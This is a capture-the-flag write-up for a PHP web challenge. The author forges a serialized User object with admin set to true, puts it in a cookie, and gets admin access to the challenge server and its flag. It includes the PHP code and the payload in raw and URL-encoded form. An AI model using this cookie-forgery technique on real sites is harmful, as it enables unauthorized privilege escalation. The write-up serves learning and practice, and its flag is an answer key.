# Educated Guess

* Category: Web Exploitation

## Description

There is a secured system running at http://shell1.2019.peactf.com:38461/query.php. You have obtained the source code. 

## Solution

The idea here is that the user's class gets automatically loaded and instantiated with the data contained in the cookie (sent by user's browser).

As the title suggests, this means that we should guess how the server script is implemented. Having control over the data sent, we can try to fool the server and get access to the flag.

After wasting some time trying to forge manually the cookie, I decided it would have been simpler to let php do the work for me.

I then created a class (User) to emulate the real one, and a script used to instantiate the class, serialize it and send me back the cookie.

```php
<?php // User.php
    class User
    {
        public $admin = true;
    }
?>
```

```php
<?php // test.php
    include 'User.php';

    $member = new User();
    $memberString = serialize( $member );
    echo "Converted the Member object to a string: '$memberString'";
    setcookie('user', $memberString);
?>
```

Visiting test.php with a browser I got this output:

Converted the Member object to a string: 'O:4:"User":1:{s:5:"admin";b:1;}'

So, the serialized class is:

> O:4:"User":1:{s:5:"admin";b:1;}

The cookie however is URL-encoded, so it shows up like this:

> O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22admin%22%3Bb%3A1%3B%7D

I then copied the cookie and send it to the challenge's server, getting this flag:

**flag{peactf_follow_conventions_503a8284f2d1f9201de4932375268282}**


